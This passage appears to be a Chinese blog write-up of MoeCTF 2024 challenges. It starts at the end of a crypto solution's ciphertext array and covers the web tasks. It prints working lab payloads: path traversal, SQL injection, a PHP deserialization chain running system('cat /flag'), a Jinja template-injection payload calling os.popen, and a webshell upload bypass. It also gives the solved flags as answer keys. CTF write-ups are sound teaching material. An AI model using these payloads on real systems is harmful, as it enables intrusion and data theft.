class="hljs-number">219205004027218279279153442572018305650</span>, <span class="hljs-number">62495663621315535552427938857863551873</span>, <span class="hljs-number">12365469869484359722316573851483855865</span>, <span class="hljs-number">84444120685499458796249283893323932282</span>, <span class="hljs-number">240719245204462516267560756675192129462</span>, <span class="hljs-number">27868242791206675092288978266113368469</span>, <span class="hljs-number">231956104988320170956546781095814860314</span>, <span class="hljs-number">238410591787987745803829175586952288627</span>, <span class="hljs-number">290649141309468101840354611586699479851</span>, <span class="hljs-number">288298044918505512172272603794059992911</span>, <span class="hljs-number">43375655853069820305921366762777897508</span>, <span class="hljs-number">195308577786654489057887409352840304641</span>, <span class="hljs-number">184459971400898842809886506207633536394</span>, <span class="hljs-number">255884612697066296714973816950917234211</span>, <span class="hljs-number">8695922085804648269560669225439485137</span>, <span class="hljs-number">109407350389195091443836128149623969417</span>, <span class="hljs-number">40151058765649465408124869078260007620</span>, <span class="hljs-number">125484946058191366826510549493690011718</span>, <span class="hljs-number">71132588066103752922321942940739808864</span>, <span class="hljs-number">74434669478187680319595294456652807097</span>, <span class="hljs-number">187368213679294937718535073296853726111</span>, <span class="hljs-number">63461505676143678393259420949793811831</span>, <span class="hljs-number">131619805472714703711458729455838994067</span>, <span class="hljs-number">8579657158619864010437706463902003097</span>, <span class="hljs-number">60626278761876782233388469543817973673</span>, <span class="hljs-number">44776499706241603722632560896220653186</span>, <span class="hljs-number">257249861781237389988455384617803171877</span>, <span class="hljs-number">161899873165011719282095749671993720527</span>, <span class="hljs-number">73303482092538159761390536102771615311</span>, <span class="hljs-number">141674253732456103774983358188317473860</span>, <span class="hljs-number">112299149158347774069079224861237069975</span>, <span class="hljs-number">192409969047313867540459549167233638120</span>, <span class="hljs-number">52560717143548208264188844553309600513</span>, <span class="hljs-number">209294007943747095607573416682772182613</span>, <span class="hljs-number">65285862009539442533024037477398617382</span>, <span class="hljs-number">141465096635701758351979378177631042196</span>, <span class="hljs-number">282970656853503001128091562858564344839</span>, <span class="hljs-number">50475483578642585644452991078499278745</span>, <span class="hljs-number">162546597698227455939743094437394415689</span>, <span class="hljs-number">65258447920153625609456176138520078583</span>, <span class="hljs-number">25184730952052088803921023041299838584</span>, <span class="hljs-number">228883100940853988548836641050823478387</span>, <span class="hljs-number">234342509561041384559923481191578502671</span>, <span class="hljs-number">96929129863331626375704681481278825323</span>, <span class="hljs-number">288533470498072097357398960101692503873</span>, <span class="hljs-number">202238020435442160571930572760188491021</span>, <span class="hljs-number">179010548891454398845389500871076122861</span>, <span class="hljs-number">210509821764943794358893224681677583929</span>, <span class="hljs-number">301357944197101288505771002301759006254</span>, <span class="hljs-number">188933290023352627523422420332593360537</span>, <span class="hljs-number">207946655777875200521742190622482472884</span>, <span class="hljs-number">288626263488145443150622420747070805416</span>, <span class="hljs-number">75616301779108425588545170038742534166</span>, <span class="hljs-number">58163857263381687168244101022135667109</span>, <span class="hljs-number">297006021514663344215599115965804102114</span>, <span class="hljs-number">297690420826548736122127126645053452341</span>, <span class="hljs-number">88307045391242971429880119414942510712</span>, <span class="hljs-number">186427606153958359494215188169120285788</span>, <span class="hljs-number">135488686276533521058776859854524444361</span>, <span class="hljs-number">185380054960856211260651416683468161990</span>, <span class="hljs-number">175033658667416561573078028845860911744</span>, <span class="hljs-number">223026004671602541191897755812121342354</span>, <span class="hljs-number">34657268786986063209312902409995458857</span>, <span class="hljs-number">120560332690000675303295481174067849230</span>, <span class="hljs-number">55304621833927249516093996383526467671</span>, <span class="hljs-number">111480233798478730015825495041130765708</span>, <span class="hljs-number">188996716801525995463705449722399676888</span>, <span class="hljs-number">276300230605454487705048192796463035731</span>, <span class="hljs-number">195951365841304132244984630163178946841</span>, <span class="hljs-number">97383655947416522972353051984313703380</span>, <span class="hljs-number">94486945760999630041197414137963583839</span>, <span class="hljs-number">180706938513681126017333618518691884990</span>, <span class="hljs-number">291355503207799224380050183085704824037</span>, <span class="hljs-number">69034413486375685936282884707402207337</span>, <span class="hljs-number">147750870458026934714106830614187010708</span>, <span class="hljs-number">45030500748522416863096615057804736553</span>, <span class="hljs-number">242760053973560804002707125041520857401</span>, <span class="hljs-number">78549841097746795170488790352479728712</span>, <span class="hljs-number">2356186555504071026416878904180857750</span>, <span class="hljs-number">250486437623828232647064146324392061051</span>, <span class="hljs-number">23443836455198610186212360005846025976</span>, <span class="hljs-number">174557226633145985326629017377610499133</span>, <span class="hljs-number">105578481831185315088267357915446186040</span>, <span class="hljs-number">275620780071666328887795273613981325091</span>, <span class="hljs-number">23435505408737317601794562472269448966</span>, <span class="hljs-number">153209223406380813663608757935808571040</span>, <span class="hljs-number">298537417505667302508269715871007454162</span>, <span class="hljs-number">203833907122687718347615710181705388877</span>, <span class="hljs-number">41923370405573382737900061813058979798</span>, <span class="hljs-number">3762696947926387653032627637114050038</span>, <span class="hljs-number">201362054098012734707571348865729525585</span>, <span class="hljs-number">285561801443127226417656620776228615886</span>, <span class="hljs-number">111526376057659222252771678197929357387</span>, <span class="hljs-number">203857473647840873587593099562928738804</span>, <span class="hljs-number">44500972779851392967974092230683443589</span>, <span class="hljs-number">131565609415497588649207556985146740667</span>, <span class="hljs-number">118140388348838985266223643241117982200</span>, <span class="hljs-number">151449885527204880099343472664885565851</span>, <span class="hljs-number">296392921256617994387220911796693904909</span>, <span class="hljs-number">171323803851876663161606688343678019752</span>, <span class="hljs-number">77152982746512263077542395226111426871</span>, <span class="hljs-number">71648764903315646849225859605038798241</span>, <span class="hljs-number">204032734481806785543119754456569617316</span>, <span class="hljs-number">6308687907566364067313782129902290691</span>, <span class="hljs-number">16601010504475415688487155708691097587</span>, <span class="hljs-number">267844409827567109183739120606590016153</span>, <span class="hljs-number">8224746302136608660764206696943998066</span>, <span class="hljs-number">66759882079234093195284745682061177129</span>, <span class="hljs-number">246382951504754280882643835151081337286</span>, <span class="hljs-number">255668159720160142170457715248631352728</span>, <span class="hljs-number">198682585307670767869381177003851088434</span>, <span class="hljs-number">52435298055396076040371814840062860322</span>, <span class="hljs-number">71487031168170283085378067681578926209</span>, <span class="hljs-number">19270201008106231446848331516948751837</span>, <span class="hljs-number">259975200953378762173082382130139147342</span>, <span class="hljs-number">100957428421542421187997144087873975651</span>, <span class="hljs-number">208596806512779765020431672051552927799</span>, <span class="hljs-number">299145970783704112359526450087000033589</span>, <span class="hljs-number">150947534399996219237186223933189906692</span>, <span class="hljs-number">2048564430495506099844799218948689248</span>, <span class="hljs-number">18962488382754079143174369765373573160</span>, <span class="hljs-number">123031997265327646442638576943887737076</span>, <span class="hljs-number">244982544573374061178705105734141424990</span>, <span class="hljs-number">146410849043938910996544914770892579969</span>, <span class="hljs-number">223289253099676841267315311685506771609</span>, <span class="hljs-number">51374350072145272462874563304717832675</span>, <span class="hljs-number">11071799523780604861063183113721965515</span>, <span class="hljs-number">64879815349665030137608387728274669513</span>, <span class="hljs-number">80407660651138778640313857555610913997</span>, <span class="hljs-number">303240361297474032656368918727922343524</span>, <span class="hljs-number">103535171867293830164396688627880762056</span>, <span class="hljs-number">80560992291681297484967629700766125368</span>, <span class="hljs-number">143230791823232014720768325847406122476</span>, <span class="hljs-number">188716605362804777650654549500430035344</span>, <span class="hljs-number">232870220205325961834389425482865329315</span>, <span class="hljs-number">283584919111555062850512413920721407255</span>, <span class="hljs-number">206566027046056486360456937040463884619</span>, <span class="hljs-number">157265544558229360994066706355140059167</span>, <span class="hljs-number">234540100059557817987307855523008271441</span>, <span class="hljs-number">145080729935010940836509908225154438654</span>, <span class="hljs-number">87632901547252991486640361323948527297</span>, <span class="hljs-number">132851295075144433057295220850764336697</span>, <span class="hljs-number">119332580967710872282556206817561230364</span>, <span class="hljs-number">252662535367310697404410284791596079390</span>, <span class="hljs-number">116953597995893914045234747272641030589</span>, <span class="hljs-number">100249498080127826743176896590140549012</span>, <span class="hljs-number">136127222991007877469608037092253387587</span>, <span class="hljs-number">293872159333237281344632727438901916796</span>, <span class="hljs-number">188380258232793584033919525452891729603</span>, <span class="hljs-number">1610116068556601814921533488550773010</span>, <span class="hljs-number">227538093179017809788576278302184723209</span>, <span class="hljs-number">96083211912155805281570727244009758189</span>, <span class="hljs-number">177565192075026414675108774674272650977</span>, <span class="hljs-number">48610376097473152433617435307712235835</span>, <span class="hljs-number">247706157308906487216795222963091222950</span>, <span class="hljs-number">158089460554439410339817265377357657075</span>, <span class="hljs-number">242596743543458727108836420358578527964</span>, <span class="hljs-number">157838486547678450498998359338995593594</span>, <span class="hljs-number">154936428786673098370270244313756793764</span>, <span class="hljs-number">230069001282099253337070315838992422706</span>, <span class="hljs-number">302203905412042965194022309363722872023</span>, <span class="hljs-number">278925578180003228386990239779184911424</span>, <span class="hljs-number">2121847168422140085785053284950978779</span>, <span class="hljs-number">88186566913792352545205577594300112005</span>, <span class="hljs-number">127051055548524716972172930848069016819</span>, <span class="hljs-number">216775577660712694343189516378309335187</span>, <span class="hljs-number">44934779747684486400910901018161470888</span>, <span class="hljs-number">32429597712898788634301884219187226083</span>, <span class="hljs-number">219683174528279300995710495669083670544</span>, <span class="hljs-number">37001671152735870067433052249003677244</span>, <span class="hljs-number">40408367335919429215031155701333780256</span>, <span class="hljs-number">156957056705864208022145617831060134907</span>, <span class="hljs-number">180077610045061934161783737112285900966</span>, <span class="hljs-number">59357544819520045255625797086421901884</span>, <span class="hljs-number">77751400794807935281264495346525107329</span>, <span class="hljs-number">4517615764752715802675887411287287137</span>, <span class="hljs-number">76319782726782483955139757169428276003</span>, <span class="hljs-number">176009402215469456144386392247781430661</span>, <span class="hljs-number">283055695252017869386094188584670242363</span>, <span class="hljs-number">20001716567499724882317501875143788088</span>, <span class="hljs-number">125228382132280749989067609697418628387</span>, <span class="hljs-number">144053090751393640875176862167012247830</span>, <span class="hljs-number">15289106046221987660093620422889539867</span>, <span class="hljs-number">111243866573605033251079958638430165633</span>, <span class="hljs-number">169264885994758018612038619809803723688</span>, <span class="hljs-number">11895954311759483419234457833286931577</span>, <span class="hljs-number">273147053963507607445612310063799123998</span>, <span class="hljs-number">158981773284803069491507978382595811562</span>, <span class="hljs-number">41293513794446810141896116395025053234</span>, <span class="hljs-number">57441237860743029006005815967510568612</span>, <span class="hljs-number">109171476551418034153338841133917497633</span>, <span class="hljs-number">136539712287056106151501004438585146777</span>, <span class="hljs-number">278918550892367788720071091355436733468</span>, <span class="hljs-number">211360251223022250021398148918837686812</span>, <span class="hljs-number">254351242496347083009146404917085951637</span>, <span class="hljs-number">130260153203964833202474997491055897705</span>, <span class="hljs-number">221930288825889900517852991745469270910</span>, <span class="hljs-number">66354211799382156899053592476719001842</span>, <span class="hljs-number">127898620670768976254134750731374490934</span>, <span class="hljs-number">298131830425274848646460016809595859328</span>, <span class="hljs-number">132109510144911727511061804395381822418</span>, <span class="hljs-number">210917766469026421985352121201196497206</span>, <span class="hljs-number">5441137715689271309917542693016936841</span>, <span class="hljs-number">209516950406881264617228336887254107528</span>, <span class="hljs-number">92275151703152148383106907311559718841</span>, <span class="hljs-number">46255650973652148247469464088017660080</span>, <span class="hljs-number">182628529221607295465655096378164148336</span>, <span class="hljs-number">52574278547120304143820897608762444985</span>, <span class="hljs-number">63698472804719856407197390836793525437</span>, <span class="hljs-number">30457182690865024857724004613999433676</span>, <span class="hljs-number">212073418196280214618461610817423630022</span>, <span class="hljs-number">48875930775858981513092672396243080640</span>, <span class="hljs-number">113234797533868946026347891158142991388</span>, <span class="hljs-number">256534108458875318962058222544020064164</span>, <span class="hljs-number">22522715662428558833985333846937440705</span>, <span class="hljs-number">97553118958308509177643330175409499003</span>, <span class="hljs-number">197088081433425221073434635573357125592</span>, <span class="hljs-number">157303116668734020456228309942188293059</span>, <span class="hljs-number">110316346669278795114546305726864504681</span>, <span class="hljs-number">228887397917708007004920589862367347873</span>, <span class="hljs-number">112210930213921962308944716344585917343</span>, <span class="hljs-number">95017760786235266842788931502689331157</span>, <span class="hljs-number">303479014347753799316861720146531596843</span>, <span class="hljs-number">138677197920058856282155251074088437081</span>, <span class="hljs-number">285912176726299387362893467150449209426</span>, <span class="hljs-number">120309832759140713296686339140142433386</span>, <span class="hljs-number">279125897926861811239250830750932241600</span>, <span class="hljs-number">289502053647872994218190050825294169535</span>, <span class="hljs-number">262459212837236162171047720358005836712</span>, <span class="hljs-number">290390838897912466575239533978002826151</span>, <span class="hljs-number">292988850197951752250595007039860868400</span>, <span class="hljs-number">34796135808311610468205608686622819504</span>, <span class="hljs-number">25206338413385638687826160218013868658</span>, <span class="hljs-number">42180804482932648992176529097078580055</span>, <span class="hljs-number">195897225052351816559125785179252565465</span>, <span class="hljs-number">290060760535408066224831756224248708027</span>, <span class="hljs-number">34243626514368402883316460494646065629</span>, <span class="hljs-number">159497726968729366867935528734367549832</span>, <span class="hljs-number">267785772871046662107247674801793846921</span>, <span class="hljs-number">47342328853090920958565777290912999560</span>, <span class="hljs-number">194980176549393239742230551297786993434</span>, <span class="hljs-number">88020247887557921707284362381274951852</span>, <span class="hljs-number">255474100333005567974457204812640809071</span>, <span class="hljs-number">93324791124684170744053910877870176609</span>, <span class="hljs-number">69542826141091170218040988642070014011</span>, <span class="hljs-number">188678529221313094426441439309063681864</span>, <span class="hljs-number">56030802691247887446204447769438570825</span>, <span class="hljs-number">74312207153349149422500961216106557393</span>, <span class="hljs-number">153811406554673020809393530896156460494</span>, <span class="hljs-number">130232956128662318657579623819323546361</span>, <span class="hljs-number">241587755919930468705435097001858194189</span>, <span class="hljs-number">150548598672513907492388638742866339038</span>, <span class="hljs-number">38780469811591978249139697733603217652</span>, <span class="hljs-number">237554030153815380781978075720171312418</span>, <span class="hljs-number">96541634878634946114738393982914693394</span>, <span class="hljs-number">83284071476491638125716901346418260661</span>, <span class="hljs-number">277535192833115492238855935055373371297</span>, <span class="hljs-number">92291115416977028401374199691398676627</span>, <span class="hljs-number">105634075531674200869064066234662065605</span>, <span class="hljs-number">59669321288506854711632528171527160495</span>, <span class="hljs-number">24913178886798791108798737682436779604</span>, <span class="hljs-number">191902245938756063865405758957515936934</span>, <span class="hljs-number">200833770402179506644143905670947994664</span>, <span class="hljs-number">249327029439265065126080906281744759655</span>, <span class="hljs-number">2368715218056973901783211260781833927</span>, <span class="hljs-number">133209645820509536502329231321782644514</span>, <span class="hljs-number">170083361139958757944996287868734988169</span>, <span class="hljs-number">143242266754832252556264383809361085258</span>, <span class="hljs-number">198438133508477313319510861550461456953</span>, <span class="hljs-number">226416574016152349355240811564666677855</span>, <span class="hljs-number">131995850810926550122710727062184985075</span>, <span class="hljs-number">206211971624338783828953817981719254101</span>, <span class="hljs-number">95022339713176475801874420969255633409</span>, <span class="hljs-number">39239785273544046574575511790952158726</span>, <span class="hljs-number">6761950061835300419279903725369635970</span>, <span class="hljs-number">160849355761964483498641169767552240859</span>, <span class="hljs-number">44129081383649229398785011378026849128</span>, <span class="hljs-number">116611486899507912253396257166983831123</span>, <span class="hljs-number">102748760887182142877957834312659347601</span>, <span class="hljs-number">100973668783270797012352094429175531207</span>, <span class="hljs-number">110548564207426762905750742091610942634</span>, <span class="hljs-number">205424582078496700107783237952155124442</span>, <span class="hljs-number">210932790939110827079725957948996247757</span>, <span class="hljs-number">54413304958149902897514912130730392489</span>, <span class="hljs-number">181315803651356180100745517014898850424</span>, <span class="hljs-number">183346938138867395962624263310328788228</span>, <span class="hljs-number">133507835720650939452036529283981720094</span>, <span class="hljs-number">244220649646693249242542702657146329679</span>, <span class="hljs-number">111814540087048948955999016117121133729</span>, <span class="hljs-number">210757262617434713384638061648414714521</span>, <span class="hljs-number">31712005436857719771604404352654183712</span>, <span class="hljs-number">299210790483067037892753875410776716305</span>, <span class="hljs-number">34216439939230284515095120240039231491</span>, <span class="hljs-number">246820219620854547856488049434101568744</span>, <span class="hljs-number">298588211282375015522910461809769779222</span>, <span class="hljs-number">53320103067319149790078933423751044737</span>, <span class="hljs-number">164977173816081040725650999609390274279</span>, <span class="hljs-number">234782977255751828939911143180631329578</span>, <span class="hljs-number">61521250269407451751766565186333346163</span>, <span class="hljs-number">119529895182262920689181379893081203421</span>, <span class="hljs-number">154588465395872896210615516764102943961</span>, <span class="hljs-number">153034255402211966905777978896125271527</span>, <span class="hljs-number">65497510688725487475002809757533544579</span>, <span class="hljs-number">76824114145168270682129892469858568031</span>, <span class="hljs-number">218064880554787781811938382300930885801</span>, <span class="hljs-number">196850060586188141836799779247809406205</span>, <span class="hljs-number">176023892018381269394229104598502170110</span>, <span class="hljs-number">32491776807255207889633110137157036238</span>, <span class="hljs-number">41150198830446315717651890670848632754</span>, <span class="hljs-number">260753023840843193587871227195221789744</span>, <span class="hljs-number">48345408122882987831052823644867513356</span>, <span class="hljs-number">80045935233531979816083287928071697883</span>, <span class="hljs-number">131878104259519592871955471048058374000</span>, <span class="hljs-number">15534379538690707223440448056318568055</span>, <span class="hljs-number">131291412522855581131329717355299310716</span>, <span class="hljs-number">37018675243998552749630837151597269431</span>, <span class="hljs-number">144343493968520204610097930388908478903</span>, <span class="hljs-number">67236444178494959708570043908346657722</span>, <span class="hljs-number">102574100831305499879105427279131095784</span>, <span class="hljs-number">249069309513964056714882166119752611668</span>, <span class="hljs-number">210718130986716991560768592011623825976</span>, <span class="hljs-number">266242407402824082344585571101593909650</span>, <span class="hljs-number">205203132247422842477137158586071965100</span>, <span class="hljs-number">301157372202750742637385626243753030679</span>, <span class="hljs-number">40886620741595313792996852647181029560</span>, <span class="hljs-number">253361171396328884567373946949359324229</span>, <span class="hljs-number">50071128101197582041162516700015376269</span>, <span class="hljs-number">106002417001877546867386840932652850816</span>, <span class="hljs-number">224086864980106045542532841236299648038</span>, <span class="hljs-number">42103921294151508500634063253613482845</span>, <span class="hljs-number">49777138159264482913170680298952908154</span>, <span class="hljs-number">24324534484842395819609478778764950811</span>, <span class="hljs-number">204106593629836179932302789646808274058</span>, <span class="hljs-number">266707066043760482642609614924857456238</span>, <span class="hljs-number">18723835069315957900598472598907945204</span>, <span class="hljs-number">244338819469013923747256697307964210342</span>, <span class="hljs-number">36296287172854997655950896217230267111</span>, <span class="hljs-number">292888671179451539882069138267865661448</span>, <span class="hljs-number">287111415651274690627399445990831389362</span>, <span class="hljs-number">79940439572496625318602146625920961720</span>, <span class="hljs-number">288270505176661814341807462681727466925</span>, <span class="hljs-number">153921178962139214138689743179633342125</span>, <span class="hljs-number">263564317934507756965522450042219801757</span>, <span class="hljs-number">197993323684501153884855839599466707355</span>, <span class="hljs-number">72143993205715719344183507132882267579</span>, <span class="hljs-number">67511075584002491895239101559049103979</span>, <span class="hljs-number">231396344630318648781207380069016790960</span>, <span class="hljs-number">268490084177254392405211695854127631350</span>, <span class="hljs-number">45968181401712207064942095991325993181</span>, <span class="hljs-number">34472329776995578971329318400545600788</span>, <span class="hljs-number">112967316661320871429337739209994987784</span>, <span class="hljs-number">209508577387521479468956337084132598710</span>, <span class="hljs-number">194445696189141465862938111222574992064</span>, <span class="hljs-number">229942079198360020568341753187100646148</span>, <span class="hljs-number">47944382795398541172186729027517882654</span>, <span class="hljs-number">54806201653083974379270761512143387910</span>, <span class="hljs-number">93457347627015900562505045196097224001</span>, <span class="hljs-number">152033139738914238723733340538181549419</span>, <span class="hljs-number">123719026823969669345162603978875451754</span>, <span class="hljs-number">154704533151410142607151617227929824563</span>, <span class="hljs-number">32428281285686815618553795197210513625</span>, <span class="hljs-number">265229864831280807254743597731258298440</span>, <span class="hljs-number">14904705423314872103792141735779112532</span>, <span class="hljs-number">177442398230615511669857060547212895616</span>, <span class="hljs-number">144918716871520627851549439448066637518</span>, <span class="hljs-number">203019416536984157536348865479415073573</span>, <span class="hljs-number">288452420706913930307744155709559750006</span>, <span class="hljs-number">282516471994395201735206793889605510595</span>, <span class="hljs-number">150722332251745138694381051866105655391</span>, <span class="hljs-number">234504581837296595003379465512031425988</span>, <span class="hljs-number">44178766618576668748878202507789103195</span>, <span class="hljs-number">217129489675072754441642067295058817201</span>, <span class="hljs-number">245087939287551829934600756568137757979</span>, <span class="hljs-number">240954534396950014938672406581264782638</span>]<br><br>decrypted_flag = decrypt_flag(ciphertext, p, a)<br><span class="hljs-built_in">print</span>(decrypted_flag)<br></code></pre></td></tr></table></figure><h1 id="Web渗透测试与审计"><a href="#Web渗透测试与审计" class="headerlink" title="Web渗透测试与审计"></a>Web渗透测试与审计</h1><h2 id="Web渗透测试与审计入门指北"><a href="#Web渗透测试与审计入门指北" class="headerlink" title="Web渗透测试与审计入门指北"></a>Web渗透测试与审计入门指北</h2><p>利用phpstudy进行搭建，得到flag</p><p><img src="/../../images/moectf/moectf2024/web%E5%85%A5%E9%97%A8.png" alt="web入门"></p><h2 id="弗拉格之地的入口"><a href="#弗拉格之地的入口" class="headerlink" title="弗拉格之地的入口"></a>弗拉格之地的入口</h2><p>进入题目，hint是爬虫，联想到robots.txt，打开得到<code>/webtutorEntry.php</code>,进入页面得到flag</p><p><strong>moectf{CONGr@Tu14TioN-foR-KNOwlNG-ROBOtS_txT10e7d}</strong></p><h2 id="ez-http"><a href="#ez-http" class="headerlink" title="ez_http"></a>ez_http</h2><img src="../../images/moectf/moectf2024/ez_http1.png" alt="ez_http1" style="zoom:50%;"><p><img src="/../../images/moectf/moectf2024/ez_http2.png" alt="ez_http2"></p><p><img src="/../../images/moectf/moectf2024/ez_http3.png" alt="ez_http3"></p><p><img src="/../../images/moectf/moectf2024/ez_http4.png" alt="ez_http4"></p><p><strong>moectf{y0u-4RE_ReA1lY-re@LlY_verY_c1EVEr!!!20ed}</strong></p><h2 id="垫刀之路01-MoeCTF？启动！"><a href="#垫刀之路01-MoeCTF？启动！" class="headerlink" title="垫刀之路01: MoeCTF？启动！"></a>垫刀之路01: MoeCTF？启动！</h2><p>正常流程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> / -&gt;<span class="hljs-built_in">cat</span> /flag <span class="hljs-comment">#提示在环境里 -&gt;输入env</span><br></code></pre></td></tr></table></figure><h2 id="垫刀之路02-普通的文件上传"><a href="#垫刀之路02-普通的文件上传" class="headerlink" title="垫刀之路02: 普通的文件上传"></a>垫刀之路02: 普通的文件上传</h2><p>提示和01一样应该也在env里</p><p>传个一句话木马，然后打开env即可</p><h2 id="垫刀之路03-这是一个图床"><a href="#垫刀之路03-这是一个图床" class="headerlink" title="垫刀之路03: 这是一个图床"></a>垫刀之路03: 这是一个图床</h2><p>加了图片限制，写一个一句话，末尾改成jpg，抓包再把jpg改成php，执行system(‘env’);就行了</p><h2 id="垫刀之路04-一个文件浏览器"><a href="#垫刀之路04-一个文件浏览器" class="headerlink" title="垫刀之路04: 一个文件浏览器"></a>垫刀之路04: 一个文件浏览器</h2><p>考察的知识点是目录遍历。简单的翻了一下不在目前的目录下通过<code>../</code>往上查找,(需要url编码),找到flag那一层，进去提示不在该文件下</p><p>根据moejail_lv1的提示猜测在tmp的目录下,里面有flag，得到答案。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?path=../../../..//tmp/flag<br></code></pre></td></tr></table></figure><h2 id="垫刀之路05-登陆网站"><a href="#垫刀之路05-登陆网站" class="headerlink" title="垫刀之路05: 登陆网站"></a>垫刀之路05: 登陆网站</h2><p>先想到是尝试爆破的，突然下面跳出以前sql注入的记录</p><p>试了一下就出来了，进行了简答的截取绕过</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">a&#x27; or 1=1 #<br></code></pre></td></tr></table></figure><h2 id="垫刀之路06-pop-base-mini-moe"><a href="#垫刀之路06-pop-base-mini-moe" class="headerlink" title="垫刀之路06: pop base mini moe"></a>垫刀之路06: pop base mini moe</h2><p>直接上wp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$evil</span>=<span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span>= <span class="hljs-string">&#x27;system&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$exp</span>-&gt;a = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br><br><span class="hljs-variable">$serialized_data</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;?data=&quot;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$serialized_data</span>) ;<br></code></pre></td></tr></table></figure><p>这里微调一下代码，$a前面的private需要改成public，要不然调用不了$a.</p><h2 id="垫刀之路07-泄漏的密码"><a href="#垫刀之路07-泄漏的密码" class="headerlink" title="垫刀之路07: 泄漏的密码"></a>垫刀之路07: 泄漏的密码</h2><p>考察的Flask，得到pin进入console里面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">&gt;&gt;&gt;os.listdir()<br>[<span class="hljs-string">&#x27;__pycache__&#x27;</span>, <span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;app.py&#x27;</span>, <span class="hljs-string">&#x27;getPIN.py&#x27;</span>, <span class="hljs-string">&#x27;static&#x27;</span>, <span class="hljs-string">&#x27;templates&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f: <span class="hljs-built_in">print</span>(f.read().strip())<br>moectf&#123;DONT_usIng-fLasK_6y_DE6UG_MOd_aNd-le4k-YOuR_p1nb&#125;<br></code></pre></td></tr></table></figure><h2 id="静态网页"><a href="#静态网页" class="headerlink" title="静态网页"></a>静态网页</h2><p>这题需要抓包看回显，orz我之前一直在看前端</p><p>看&#x2F;api&#x2F;get&#x2F;?id&#x3D;1-53可以得到具体的php</p><p>进去是一个MD5绕过</p><p>原来想着自绕过的，但是没有办法</p><p>后来直接a&#x3D;0a，b[0a]&#x3D;md5(0a)即可绕过，思路没转过来</p><h2 id="who’s-blog"><a href="#who’s-blog" class="headerlink" title="who’s blog?"></a>who’s blog?</h2><p>fenjing一把梭得到答案</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=&#123;&#123;cycler.next.__globals__.__builtins__.__import__(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;env&#x27;</span>).<span class="hljs-built_in">read</span>()&#125;&#125;;<br></code></pre></td></tr></table></figure><h2 id="ProveYourLove"><a href="#ProveYourLove" class="headerlink" title="ProveYourLove"></a>ProveYourLove</h2><p>方法1：抓包，发包得到flag</p><p><img src="/../../images/moectf/moectf2024/love1.png" alt="love1"></p><p><img src="/../../images/moectf/moectf2024/love2.png" alt="love2"></p><p>方法2：不会第一种可以手动删cookie，慢慢按</p><p>方法3：我做的时候没想到发包，在对应前端检测的地方打断点控制台绕过了，不推荐</p><h2 id="弗拉格之地的挑战"><a href="#弗拉格之地的挑战" class="headerlink" title="弗拉格之地的挑战"></a>弗拉格之地的挑战</h2><p>第0层：直接进&#x2F;flag1ab.html</p><p>第一层：看源码得到提示和下一层</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--flag1: bW9lY3Rm--&gt;</span><br><span class="hljs-comment">&lt;!--下一步：/flag2hh.php--&gt;</span><br></code></pre></td></tr></table></figure><p>第二层：如图所示</p><p><img src="/../../images/moectf/moectf2024/%E6%8C%91%E6%88%98.png" alt="挑战"></p><table><thead><tr><th>flag2</th><th>e0FmdEV</th></tr></thead><tbody><tr><td>nextpage</td><td>&#x2F;flag3cad.php</td></tr></tbody></table><p>第三层:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">a</span>=a<br><span class="hljs-attribute">b</span>=a<br>cookie:<span class="hljs-attribute">verify</span>=admin<br></code></pre></td></tr></table></figure><p><code>flag3: yX3RoMXN</code></p><p><code>/flag4bbc.php</code></p><p>第四层：</p><p>控制台手动触发打断点</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">var</span> <span class="hljs-keyword">event</span> = <span 